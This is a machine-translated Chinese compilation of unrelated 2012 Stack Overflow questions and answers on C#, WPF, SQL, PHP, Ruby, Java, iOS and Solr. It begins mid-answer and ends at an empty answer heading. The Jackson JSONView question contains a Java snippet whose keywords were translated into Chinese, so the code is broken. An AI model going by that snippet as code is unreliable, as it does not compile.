`%F %M %L`是通过 Java 中的反射或堆栈回溯实现的，因此这并没有您期望的那么快。我建议对课程使用固定名称。例如，使用`class.getName()`.

# c# - DataTable 未绑定到 DataGrid 的 DataContext

> ID：13703319
> 
> 赞同：1
> 
> 时间：2012-12-04T12:49:32.803
> 
> 标签：c#, wpf, datagrid, observablecollection, datacontext

我有一个`DataGrid`，遵循 XAML：

```
 <DataGrid ItemsSource="{Binding Path=propCollection}"
              SelectedItem="{Binding Path=SelectProp, Mode=TwoWay}"
              Margin="-1,159,0,0" 
              RowDetailsVisibilityMode="Visible" 
              AreRowDetailsFrozen="False" 
              CanUserReorderColumns="False" 
              CanUserSortColumns="True" 
              CanUserResizeRows="False"  
              SelectionUnit="FullRow" 
              AlternatingRowBackground="{x:Null}" 
              SelectionChanged="dgProprietarios_SelectionChanged"
              AlternationCount="0"
              Height="200" 
              HorizontalAlignment="Left"
              Name="dgProprietarios" 
              VerticalAlignment="Top" 
              Width="645" 
              AutoGenerateColumns="False">
                 <...Columns...>
    </DataGrid> 
```

在我的**Window_Loaded 上**，我执行以下操作：

```
dgProprietarios.DataContext = new ProprietariosViewModel(new Dictionary<string, string>()); 
```

我的**ProprietariosViewModel**如下：

```
public CollectionProprietarios propCollection { get; set; }

public ProprietariosViewModel(Dictionary<string, string> Where)
{
    propCollection = new CollectionProprietarios(Where);
} 
```

**CollectionProprietarios**类继承**ObservableCollection**并具有以下代码：

```
 public CollectionProprietarios(Dictionary<string, string> Where)
    {
        Add(new Dados(Where));
    }

    public new void Add(Dados dados)
    {
        base.Add(dados);
    } 
```

类**Dados**具有以下代码：

```
public DataTable ProprietariosRetorno { get; private set; }

public Dados(Dictionary<string, string> Where)
{

    var ado = new ADO();
    ProprietariosRetorno = ado.RetornaSelect(MontaQuery(Where));

} 
```

函数**MontaQuery**只是创建一个包含 SELECT 子句的字符串，而**RetornaSelect**执行此查询。

**ADO**类在实例化时只创建数据库和表（如果它不存在）。

问题是，所有这些都在起作用。在调试时，我可以检索 DataContext 中的值，它包含带有值的 DataTable。但是由于某种原因，程序运行时它没有出现在 DataGrid 上。

所以问题是，我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:58:46.817

尝试使用

```
dgProprietarios.DataContext = new ProprietariosViewModel(new Dictionary<string, string>());
dgProprietarios.Items.Refresh(); 
```

# c# - c#从sql数据库下载文件，显示下载状态

> ID：13703323
> 
> 赞同：0
> 
> 时间：2012-12-04T12:49:51.530
> 
> 标签：c#, database, file, download

我有一个 c# 中的应用程序和一个与它一起使用的 sql 数据库（插入、更新、下载等）。我的主要问题是，当我尝试从 sql 数据库下载/上传文件（例如 pdf 文件）时，文件足够大或互联网速度不是那么快，程序被卡住了。我的意思是上传/下载该文件需要很长时间，直到完成“没有任何反应”。我只是想显示一个进度条或其他东西来显示正在下载并显示其状态。

详细说明：“fileok”列是图像文件类型

我正在尝试从该列下载保存的文件，如下所示：

```
dbbyte = (byte[])adattabla2.Rows[0]["fileok"]; 
```

并将文件上传到数据库，如下所示：

```
sqlcmd.Parameters.AddWithValue("@FF", FileBytes); 
```

它获取/上传存储的文件，如果这个大或网络很慢，它需要一段时间，直到它完成它就像“冻结”一样。完成后，程序继续。所以程序正在运行我只需要通知用户它正在下载并显示它的状态。我该怎么做？我找不到任何有用的东西，只对下载网址、链接有帮助，但对这样的数据库没有帮助。

我会感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:56:50.920

使用 a`BackgroundWorker`和 be a `ProgressBar`，请参见[此处](http://msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx)和[此处](https://stackoverflow.com/questions/8447856/displaying-a-progressbar-while-executing-an-sql-query)

# sql - 转换为浮点数：CAST vs CONVERT vs *1.0

> ID：13703325
> 
> 赞同：3
> 
> 时间：2012-12-04T12:50:04.803
> 
> 标签：sql, sql-server, floating-point, int

哪个是首选，为什么？为了清楚起见，我使用整数值，但是这些将是字段名称。

1.  `SELECT 2*1.0 / 3`
2.  `SELECT CAST(2 AS float) / 3`
3.  `SELECT CONVERT(float, 2) / 3`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T15:21:47.330

从关于第一个和 CAST/CONVERT 的性能角度来看，我快速创建了一个临时表并使用 2 的值对其进行查询：

```
CREATE TABLE #temp (Two FLOAT)
INSERT INTO #temp VALUES (2)
SELECT * FROM #temp

SELECT Two*1.0 / 3 FROM #temp
SELECT Two*1E0 / 3 FROM #temp
SELECT CAST(Two AS FLOAT) / 3 FROM #temp
SELECT CONVERT(FLOAT,Two) / 3 FROM #temp 
```

从中选择时，无论我输入多少不同的值，执行计划和统计信息 IO 都会给我相同的数字（每个四分之一）。我尝试输入其他值，如 5、6、7、8、9 等，甚至更多值，但成本相同。从上面列出的超越关系文章（这里：[http ://beyondrelational.com/modules/2/blogs/77/posts/11334/cast-vs-convert-is-there-a-difference-as-far-as -sql-server-is-concerned-which-is-better.aspx](http://beyondrelational.com/modules/2/blogs/77/posts/11334/cast-vs-convert-is-there-a-difference-as-far-as-sql-server-is-concerned-which-is-better.aspx)），使用你的第一种方法似乎没有任何效果，至少在小值上（我确实使用了 2,000,000）。

# c# - 列表 列出

> ID：13703326
> 
> 赞同：2
> 
> 时间：2012-12-04T12:50:05.040
> 
> 标签：c#, .net

```
public class emp
{
    public int id { get; set; }
    public string name { get; set; }
}

public class employee
{
    public List<emp> Result { get; set; }
} 
```

我想转换上面的类

```
List<employee> e=new List<employee>(); 
```

至

```
List<string> onj =new  List<string>(); 
```

谁能指导我？提前致谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-04T12:52:06.377

```
List<String> onj = e.Select(employee => employee.Name).ToList(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T12:54:09.853

可以做这样的事情

```
public class emp
{
    public int id{ get; set; }
    public string name { get; set; }

   public override string ToString() {
       return id + " " + name;
   }
} 
```

之后

```
List<string> strings = new List<string>();
List<employee> e=new List<employee>();   
e.ForEach(x=> {
    strings.Add(s.toString());
}); 
```

所以你会得到一个字符串列表，其中*每个*字符串都表示`emp`类型，比如`ID SPACE NAME`

如果这不是您的意图，请澄清您的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T12:53:12.583

您可以使用[`String.Join`](http://msdn.microsoft.com/en-us/library/dd992421.aspx)连接字符串，例如使用逗号：

```
IEnumerable<string> empsNames = e.Select(employee => 
    string.Join(",", employee.Result.Select(emp => emp.name))); 
```

如果您想通过以下方式加入这些`Enumerable.NewLine`：

```
string result = string.Join(Environment.NewLine, empsNames); 
```

或者，如果您想从中创建一个`List<String>`（根据需要；））：

```
List<string> onj = empsNames.ToList(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T12:53:16.977

你可以这样做：

```
foreach (var employee in e) {
{

} 
```

# ruby-on-rails - Nokogiri: node_set.rb:239: [BUG] 分段错误

> ID：13703327
> 
> 赞同：1
> 
> 时间：2012-12-04T12:50:06.877
> 
> 标签：ruby-on-rails, ruby, nokogiri

我目前正在抓取一些 RSS 提要并将项目收集到节点集中。这很好用，但是 Nokogiri 会因某些项目而崩溃。起初我认为我的 OSX 开发环境有问题，所以安装了一个 Debian 服务器并得到了完全相同的错误。还尝试将 Ruby 从 1.9.3 降级到 1.9.2。

有什么建议么？

部分代码：

```
doc.xpath("//item").remove
nodeset = doc.xpath("//item")
..
api_doc.xpath("//item").each do |node|
  node = check_score(node)
  unless node.nil?
    nodeset << node
  end
end

def check_score(node)
  if node.xpath('website:attr[@name="imdbscore"]/@value').text.to_i > 6
    return node
  end
end

# sorting and finally add nodeset to doc. 
```

[崩溃日志在这里..](http://pastebin.com/73J6HZa7)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T15:25:23.503

我认为删除所有`//item`节点然后尝试找到它们是不好的做法。就在那里，我可以看到麻烦正在酝酿。

这将从文档中删除所有`<item>`节点：

```
doc.xpath("//item").remove 
```

这会尝试查找所有`<item>`节点，这将返回一个空的 NodeSet：

```
nodeset = doc.xpath("//item") 
```

您没有显示`api_doc`来自哪里，但如果它是来自的节点`doc`，尤其是在您删除节点之前，它的状态是可疑的，因为您可能对删除的`<item>`节点有一些悬空引用。照原样，这会尝试遍历所有`<item>`可能不存在的节点，因此可能会返回一个空的 NodeSet，或者更糟的是，可能会被损坏：

```
api_doc.xpath("//item").each do |node|
  node = check_score(node)
  unless node.nil?
    nodeset << node
  end
end 
```

我会检查您的 Nokogiri 和 LibXML2 的修订，并确保它们是最新的。如果没有，请更新它们。`<item>`在寻找它们之前，我还会重新考虑删除所有节点的逻辑。

如果您解释您正在尝试做什么，并分享一个 XML 的小示例，也许我们可以为您提供更好的帮助。

# php - 管理不同的用户组以查看页面

> ID：13703331
> 
> 赞同：3
> 
> 时间：2012-12-04T12:50:16.010
> 
> 标签：php, authentication, login

在我的应用程序中，有不同的用户组，例如学生、教师、管理员、校长等，可以登录到我的应用程序。而且我有一个 php，例如 student_add.php，它是一个学生管理员，所以只有管理员可以查看该页面。

现在我必须设置文件“students_add.php”只能由**管理员**访问。为此，我可以像这样创建一个会话变量`$_SESSION['user_type'] = 'A'`，通过在用户登录我的应用程序时检查会话变量，我可以使用`header()`和**.htaccess 重定向**或设置 404 错误。但我不想对我的应用程序中的每个文件都使用这种检查机制。

所以，我想要一个简单的解决方案来解决我的问题，还请让我知道有哪些方法/逻辑可以控制 PHP 中不同用户组访问的页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:01:26.810

您基本上**必须**检查每个脚本，因为没有其他方法。唯一的方法是你如何做到这一点。最好的方法是将检查代码移动到单独的脚本中，然后简单地将其包含在每个其他脚本的开头

```
require_once('my_checking_script.php`); 
```

这是最干净的方法。或者，如果您有**非常非常**多的脚本，您可以使用`php.ini`'`auto_prepend_file`指令。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:02:12.030

没有魔术。

**管理员.php**

```
if(not admin) logout
... 
```

**用户.php**

```
if(not user or admin) logout
... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:13:31.243

我很确定每次需要检查用户凭据时都必须检查它们。也许 OOP 可以从重复自己中减轻一些痛苦，但是，每次用户做某事时，您都需要以某种方式区分用户组及其访问权限。

我目前在管理用户组权限时使用数字用户级别。数量越大，用户拥有的权限越多。因此，单个文件中可以有不同类型的代码块（或只有某些用户可以访问的不同类型的文件）。一个简单的例子：

```
<?php
if ($user_level >= 1){
  //this is allowed fo basic users (and of course advanced users)

  if ($user_level >= 5){
    //this is allowed for advanced users (i.e. principal) but not basic users
  }

  //and again, this is allowed fo basic users (and of course advanced users)
}
?> 
```

除了一个`user_level`，你当然可以有特殊的属性，比如`is_admin`等等。但你总是必须把它写下来。如果您（或其他人）第一次遇到编程允许的操作（和限制）的麻烦，计算机/程序最后一次做您希望他们做的任何事情是什么时候？

# php - php sql将来自不同数据库的多个表连接在一起

> ID：13703337
> 
> 赞同：3
> 
> 时间：2012-12-04T12:50:31.183
> 
> 标签：php, mysql, sql, join, pdo

我有 3 个数据库，现在我需要将每个数据库中的几个表连接到一个查询中。我该怎么做呢？

**这是我的连接：**

```
try {
    $con_options = array(
        PDO::ATTR_EMULATE_PREPARES => false,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8',
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,  // _SILENT (pub) || _WARNING || _EXCEPTION  (dev)
    );

    $con_1 = new PDO('mysql:host=localhost; dbname=database_1', 'user_1', 'pass_1', $con_options);
    $con_2 = new PDO('mysql:host=localhost; dbname=database_2', 'user_2', 'pass_2', $con_options);
    $con_3 = new PDO('mysql:host=localhost; dbname=database_3', 'user_3', 'pass_3', $con_options);

} catch (PDOException $err) { 
    //  catch, record/log and do stuff with errors
} 
```

我有 3 个不同的用户，每个数据库都有一个唯一的密码。一个数据库存储 facebook-apps 和其他 iframe 应用程序的应用程序数据。另一个保存所有网店数据，如产品、订单、客户等，而第三个保存网站结构和内容。

现在; 我想以`JOIN`某种方式将它们三个放在一个查询中。

在我写这个问题的时候；我得到的一个想法是让另一个“超级”用户可以访问所有三个数据库并且只进行常规多表查询？这会是一个可以接受的解决方案吗？

如果是这样，我是否必须在查询中指定哪个数据库？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T12:58:43.253

您将需要一个可以访问所有三个数据库的用户。

您将通过指定完整的表名将它们连接在一起，如下所示：

```
SELECT * FROM database_1.logs AS d1 LEFT JOIN database_2.users AS d2 
  ON d1.username = d2.username ORDER BY d1.timestamp DESC LIMIT 10 
```

# solr - solr 服务器的系统要求？

> ID：13703338
> 
> 赞同：7
> 
> 时间：2012-12-04T12:50:33.420
> 
> 标签：solr

solr 服务器以更好的方式运行和执行的最低系统要求是什么？

例如，

1.  内存大小
2.  磁盘空间和其他详细信息...

在我的例子中，solr 处理大约 1GB 的索引数据。您能否指定此硬件/系统要求以更好地处理...

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-12-04T13:04:42.373

这个问题没有明确的答案，如本文所述 -[在摘要中调整硬件大小：为什么我们没有明确的答案。](https://lucidworks.com/post/sizing-hardware-in-the-abstract-why-we-dont-have-a-definitive-answer/)这完全取决于您的数据、索引的结构等。

以下是一些可能对您有所帮助的额外资源：

*   [估计 Lucene/Solr 的内存和存储](https://lucidworks.com/post/estimating-memory-and-storage-for-lucenesolr/)
*   [Lucene/Solr 大小估计电子表格](https://svn.apache.org/repos/asf/lucene/dev/tags/lucene_solr_4_2_0/dev-tools/size-estimator-lucene-solr.xls)（来自上一篇文章）

一个很好的例子是您的评论说您的索引在 4GB 机器上表现良好，但在 1GB 机器上表现不佳。

# ios - Cocos2D场景在iOS6中不全屏

> ID：13703339
> 
> 赞同：0
> 
> 时间：2012-12-04T12:50:34.220
> 
> 标签：ios, cocos2d-iphone

我对 iOS5 和 5.1 没有任何问题。场景加载没有问题.. ![在此处输入图像描述](../Images/536a0738208a178ce612e95fd8588548.png)

但是 iOS6 给了我一个小问题.. 与上图不同，场景不是全屏..

![在此处输入图像描述](../Images/99f57abacc3724dd69c40a3136c214f1.png)

我该如何解决这个问题？谢谢..

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-12-04T18:36:39.447

看起来像锚点问题而不是全屏问题。

假设两者的位置为 (0,0) - 您的顶部图像的锚点为 (0,0)，而底部图像的锚点为 (0.5, 0.5)。

尽管需要有关您的代码的更多信息。

**编辑：**使用您列出的代码，看起来他们将 SCREEN_CENTER 定义硬编码为：

```
#define SCREEN_CENTER       CGPointMake(240, 160) 
```

我会将 SCREEN_CENTER 替换为：

```
CGSize winSize = [[CCDirector sharedDirector] winSize];
CGPoint point = ccp(winSize.width/2, winSize.height/2); 
```

# r - R函数搜索函数

> ID：13703344
> 
> 赞同：3
> 
> 时间：2012-12-04T12:50:45.750
> 
> 标签：r, matlab, optimization, nonlinear-optimization

更新：最初的问题是：是否有一个 R 函数使用在 matlab 中的“lsqnonlin”函数中实现的相同算法？但是，答案与在 R 中搜索函数更相关。我认为答案通常对 R 用户非常有帮助。所以我编辑了标题，但在这里再次问了原来的问题：[在 R 中，如何进行涉及求解微分方程的非线性最小二乘优化？](https://stackoverflow.com/questions/14687326/implementation-of-trust-region-reflective-optimization-algorithm-in-r)

我正在做非线性最小二乘优化，发现 matlab 函数`lsqnonlin`比我在 R 中尝试过的所有优化算法（包括函数`optimx`、`nlm`、`nlminb`、`solnp`等）执行得更好，因为它更快并且发现“更多正确”的解决方案。

但是，我没有在 R 中找到在 Matlab 中使用的“信任区域反射”算法的实现。有人知道是否已经有实现吗？此外，“信任区域反射”算法是否总是这种优化的更好算法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T14:04:52.853

听起来包装`lsqnonlin`中`pracma`就是您要寻找的东西。

我建议`sos`为 R 安装该软件包。它的目的是帮助您回答诸如“有这样的功能吗？”之类的问题。`findFn`在此包中将搜索 CRAN 上的内容以查找您提供的术语。

```
library(sos)
findFn('lsqnonlin') 
```

# php - 与 strtotime() 第二个参数混淆

> ID：13703348
> 
> 赞同：1
> 
> 时间：2012-12-04T12:50:54.013
> 
> 标签：php, datetime

[来自 PHP 文档](http://php.net/manual/en/function.strtotime.php)

> strtotime — 将任何英文文本日期时间描述解析为 Unix 时间戳描述 int strtotime ( string $time [, int $now = time() ] )
> 
> 该函数期望得到一个包含英文日期格式的字符串，并将尝试将该格式解析为 Unix 时间戳（自 1970 年 1 月 1 日 00:00:00 UTC 以来的秒数），**相对于现在给出的时间戳，或如果 now 没有提供当前时间**。
> 
> **此函数的每个参数都使用默认时区，除非在该参数中指定了时区。注意不要在每个参数中使用不同的时区，除非是有意的。**有关定义默认时区的各种方法，请参阅 date_default_timezone_get()。参数

我不知道我的q是不是傻，如果事先请原谅，但是：

我无法理解第二个参数的目的，UNIX TIMESTAMP（相对于 UNIX EPOCH 过去的秒数）如何与另一个时间相关？

我也无法理解 UNIX TIMESTAMP（第二个参数）如何具有时区？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:00:05.613

> 我不明白 UNIX TIMESTAMP（第二个参数）如何有时区？

它没有 - 但字符串可能是非 UTC 而没有明确的时区/时区偏移量。

# java - 具有包含/排除属性的 JSONView 注释

> ID：13703349
> 
> 赞同：5
> 
> 时间：2012-12-04T12:50:57.230
> 
> 标签：java, json, jackson

我有一个用例，似乎更适合将 JSONView 注释与排除信息一起使用，例如：

```
@JSONView(Views.Report1.class, include=false) 
```

到目前为止，杰克逊（1.9.2）不直接支持（包括属性），我想知道杰克逊是否有一个简单的解决方法来实现这一点。

**用例：**

*   Report1：这个视图应该有`id, name, info1, info2, info3, info4`属性
*   Report2：这个视图应该有`id, name, info1, info2, info4`属性
*   报告[3 ..] 说许多其他观点是可能的

```
私人 int id；
  私有字符串名称；
  私人字符串信息1；
  私人字符串信息2；
  //如果 view=report2 则忽略
  @JsonView(ReportViews.Report2.class , include=false)
  私有字符串 info3;
  私有字符串 info4;

```

我的用例是排除基于视图的属性（或者说报告 ID）。使用 JSONView 方法，我需要将除 Report2 之外的所有视图添加到 info3 属性以将其排除。不太合适。

在这种情况下，正确的方法应该是什么？如果没有类似的东西已经可用，是否定制 JSONView 以排除/包含将是正确的解决方案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-31T05:23:54.500

似乎没有办法以这种方式从特定视图中排除字段。

但是，您可以通过使用接口从所需元素组合视图来非常灵活地构建视图。

在上述情况下，我会尝试这个：

```
public class ReportViews {
    public interface NeedsInfo3 {};

    public static class Report1 implements NeedsInfo3 {};
    public static class Report2 {};
} 
```

然后在您的模型中使用特定于字段的视图。

```
private int id;
private String name;
private String info1;
private String info2;

@JsonView(ReportViews.NeedsInfo3.class)
private String info3;
private String info4; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-05T01:20:12.943

Jackson 的 JSON 视图功能基于包含标准，因此您无法更改现有注释。

# vb.net - 如何修复此 COMException - “类未注册（来自 HRESULT 的异常：0x80040154”

> ID：13703350
> 
> 赞同：0
> 
> 时间：2012-12-04T12:50:57.790
> 
> 标签：vb.net, exception, controls, comexception

我有一个[VB.NET](http://en.wikipedia.org/wiki/Visual_Basic_.NET)项目，它在我的开发机器上运行良好（自然:-)），但是在我测试的两台不同的计算机上，当我尝试打开特定表单时出现以下错误。所有三台计算机（包括我的开发机器，可以运行）都是 Windows 7 64 位机器，两台专业版（包括我的），第三台是家庭基本版。

我怀疑它与我插入的[Windows Media Player或 Adob​​e SWF 播放器控件有关。](http://en.wikipedia.org/wiki/Windows_Media_Player)这是错误：

```
System.Runtime.InteropServices.COMException (0x80040154): Class not registered (Exception from HRESULT: 0x80040154 (REGDB_E_CLASSNOTREG))
at System.Windows.Forms.UnsafeNativeMethods.CoCreateInstance(Guid& clsid, Object punkOuter, Int32 context, Guid& iid)
at System.Windows.Forms.AxHost.CreateWithoutLicense(Guid clsid)
at System.Windows.Forms.AxHost.CreateWithLicense(String license, Guid clsid)
at System.Windows.Forms.AxHost.CreateInstanceCore(Guid clsid)
at System.Windows.Forms.AxHost.CreateInstance()
at System.Windows.Forms.AxHost.GetOcxCreate()
at System.Windows.Forms.AxHost.TransitionUpTo(Int32 state)
at System.Windows.Forms.AxHost.CreateHandle()
at System.Windows.Forms.Control.CreateControl(Boolean fIgnoreVisible)
at System.Windows.Forms.Control.CreateControl(Boolean fIgnoreVisible)
at System.Windows.Forms.AxHost.EndInit()
at WizoDesktop.FormPlayer.c4cf84dbbc00986a0b43ce266bdec20d7()
at WizoDesktop.FormPlayer..ctor()
at A.c237671a6e3a2745adc05bbdc0150506d.cff280b017b22ca351191a6adb2feeae4()
at System.Windows.Forms.Command.Invoke()
at System.Windows.Forms.Control.WmCommand(Message& m)
at System.Windows.Forms.Control.WndProc(Message& m)
at System.Windows.Forms.Form.WndProc(Message& m)
at System.Windows.Forms.NativeWindow.Callback(IntPtr hWnd, Int32 msg, IntPtr wparam, IntPtr lparam) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T18:25:13.357

就像 Hans 说的那样，发生这种情况是因为您正在使用的程序（WMP、Flash）可能没有安装在目标机器上。您可以做的最简单的事情就是尝试检测这一点并警告用户他们需要安装这些程序才能获得全部功能。所以是这样的：

```
Try
     Dim test as New WindowMediaPlayerControl 
Catch ex as exception
     MsgBox("The program requires Media Player to be installed.")
End Try 
```

然后你甚至可以设置一个标志，这样你就可以避免加载带有控件的窗口，以避免用户看到错误。

我不确定这是否可行，但如果您使用 ClickOnce 部署，您可以在此处查看是否可以将自定义所需的安装程序添加到您的程序中。[http://msdn.microsoft.com/en-us/library/ms165429(VS.80).aspx](http://msdn.microsoft.com/en-us/library/ms165429(VS.80).aspx)

**编辑**：正如汉斯指出的那样，我的 Try Catch 上面有点懒惰，如果您尝试处理特定错误，您应该始终尝试非常具体。这种情况下是这样的。

```
Catch ex As System.Runtime.InteropServices.COMException When ex.Message.Contains("REGDB_E_CLASSNOTREG") 
```

# c# - 加载一定数量的文件而不是扫描并加载目录中的所有文件

> ID：13703354
> 
> 赞同：2
> 
> 时间：2012-12-04T12:51:11.007
> 
> 标签：c#, vb.net, file, directory

在 vb.net 或 C# 中，是否可以从文件夹中检索一定数量的文件（例如 100 个）而不是扫描所有文件（例如 1000000）并全部检索它们？

如果是，那么实施是什么？

非常感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T12:54:32.320

在 .Net Framework 4.0 及更高版本中，您可以使用[DirectoryInfo.EnumerateFiles](http://msdn.microsoft.com/en-us/library/dd413232.aspx)并获取任意数量的文件。此方法在返回之前不需要对目录进行全面扫描。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T22:48:13.320

由于您需要一个适用于版本 4 之前的 .NET Framework 版本的解决方案，因此唯一想到的是 WinAPI 的[FindFirstFile](http://msdn.microsoft.com/en-us/library/windows/desktop/aa364418%28v=vs.85%29.aspx)和[FindNextFile](http://msdn.microsoft.com/en-us/library/windows/desktop/aa364428%28v=vs.85%29.aspx)函数。

看看这个[`EnumerateFiles`](http://www.bratched.com/fr/index/dotnet/52-playing-with-findfirstfile-and-findnextfile.html)基于这些 WinAPI 函数的实现。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T12:54:37.047

```
foreach (var file in new DirectoryInfo("c:/mydirectory").EnumerateFiles())
{
    //do stuff
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-05T07:44:00.363

我猜你应该首先调用[GetFiles](http://msdn.microsoft.com/en-us/library/4cyf24ss.aspx)方法来检索与目录相关的所有文件的路径（文件尚未读取），然后从集合中读取前 100 个文件（例如，使用 StreamReader 等）。

如果框架低于 4，这将起作用。

# ios - 在 UIView 中自动调整子视图

> ID：13703363
> 
> 赞同：0
> 
> 时间：2012-12-04T12:51:41.367
> 
> 标签：ios, uiview, uiviewcontroller, uiviewanimation

我在 UIView 中添加了 no.of 子视图，在运行时我正在使用基本的 UIAnimations 更改 UIView 的框架（增加）。但是我添加的子视图并没有与超级视图成比例地增加/减少。在界面构建器中，我调整了所有子视图的自动调整大小掩码，以根据父/超级视图进行调整。但它没有用。有人可以帮我吗？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T16:00:11.870

确保您调整大小的视图的***autoresizesSubviews***属性设置为 YES

# prototypejs - Javascript Prototype 使用掩码按名称选择元素

> ID：13703365
> 
> 赞同：2
> 
> 时间：2012-12-04T12:51:54.647
> 
> 标签：prototypejs

我有几个输入：

```
<input name="row.type[0].value">
<input name="row.type[1].value">
....
<input name="row.type[100].value"> 
```

如何获得包含所有这些输入的数组？

如果使用 $$-操作，那么类似的方法不起作用：

```
var cabins = $$('input[name^=row.type[].value]').each(function(row) {
   //stuff
}); 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-05T15:06:14.723

如果您要抓取的所有输入的名称都以 开头`row.type[`，那么您可以使用以下方式抓取它们`$$()`：

```
var cabins = $$('input[name^="row.type["]'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T16:24:04.343

如果您向所有输入字段添加一个类，您可以使用该类访问它们

例如

```
<input class="rowvalues" name="row.type[0].value">
<input class="rowvalues" name="row.type[1].value">
....
<input class="rowvalues" name="row.type[100].value"> 
```

然后使用`$$()`

```
var cabins = $$('.rowvalues').each(function(row){
    //other code
    //row equals the DOM element not the input value
}); 
```

# java - 将数据从 TinyDB 导出到 CSV App Inventor

> ID：13703366
> 
> 赞同：1
> 
> 时间：2012-12-04T12:51:54.813
> 
> 标签：java, android, export-to-csv, sd-card, app-inventor

我希望有人可以帮助我，或者至少给我一些想法。

我正在为工程行业开发 App Inventor 应用程序。该应用程序基本完成，但App Inventor 不支持I/O 到sd 卡。

现在我需要能够在不使用任何互联网连接的情况下以某种方式从应用程序获取数据到电脑（即仅通过 USB 或 WIFI）（也不能使用蓝牙）

我在 Eclipse 中编写了一个简短的 Java 应用程序，可以将一些数据保存到 sdcard，但我不知道如何从 App Inventor 中启动该应用程序。

关于如何在不必在 Eclipse 中重新编写整个应用程序的情况下完成此操作的任何想法？

这是需要启动的 Eclipse 应用程序的代码：

```
 package tlc.savetosd;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;

import android.app.Activity;
//import android.content.DialogInterface.OnClickListener;
import android.os.Bundle;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import android.view.View.OnClickListener;

public class Savetosd extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_savetosd);     

        final EditText txtData = (EditText) findViewById(R.id.edtText);
        this.getPackageName();
        TextView txt = (TextView) findViewById(R.id.textView1);

         Button btnSave = (Button) findViewById(R.id.btnSave);
         btnSave.setOnClickListener(new OnClickListener() {

            public void onClick(View v) {
        // write on SD card file data in the text box
        try {
            File myFile = new File("/sdcard/mysdfile.txt");
            myFile.createNewFile();
            FileOutputStream fOut = new FileOutputStream(myFile);
            OutputStreamWriter myOutWriter = 
                                    new OutputStreamWriter(fOut);
            myOutWriter.append(txtData.getText());
            myOutWriter.close();
            fOut.close();
            Toast.makeText(getBaseContext(),
                    "Done writing SD 'mysdfile.txt'",
                    Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(getBaseContext(), e.getMessage(),
                    Toast.LENGTH_SHORT).show();
        }
    }// onClick
    });

}

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.activity_savetosd, menu);
        return true;    
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:08:37.620

[您可以使用Activity Starter](http://appinventor.mit.edu/explore/content/other-components.html#ActivityStarter)从 App Inventor 中启动其他应用程序。[还可以在此处查看有关使用活动启动器的](http://appinventor.mit.edu/explore/content/using-activity-starter.html)
更多信息。

> **启动任意应用程序**
> 
> 如果您知道**包名**和**类名**或适当的意图，则可以使用 Activity Starter 启动任何活动。一些开发人员记录这些意图是为了其他 Android 开发人员的利益。有关使用 Intent 启动其他应用程序的提示，请参阅 Android API 文档或搜索 Android 开发者论坛。
> 
> 如果您的手机上有一个应用程序并且您没有源代码，您仍然可以通过启动应用程序并检查 Android 系统日志来确定包名和类名（有时是意图），如所示以上。

**更新：您同时可以在**[这里](http://puravidaapps.com/savetosd.php)找到一个小教程“如何使用 Activity Starter 调用 Java 应用程序将文本文件保存到 SD 卡”

# java - 在加密/解密中排除一组字符

> ID：13703371
> 
> 赞同：0
> 
> 时间：2012-12-04T12:52:08.233
> 
> 标签：java, cryptography, encryption

加密和解密完成后我面临一些问题。我正在尝试使用 JAVA Crypt API 加密/解密我的查询字符串（不是主机名和上下文）。我们永远不知道我们会得到什么样的字符串。嗯，这正在正常发生。完成此加密后，我需要将此 URL 传递给 JS 函数，在该函数中抛出**Unterminated String Constant**失败。这里的问题`/`在于角色等等。

此外，由于没有发生初始加密，因此很少有其他字符。**例如：+**

我还看到加密字符串中的换行符很少。为什么这个换行符？它是加密的一部分吗？现在我想弄清楚造成这个问题的字符，我想告诉加密算法不要使用这些字符集。有没有办法我们可以做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:19:19.210

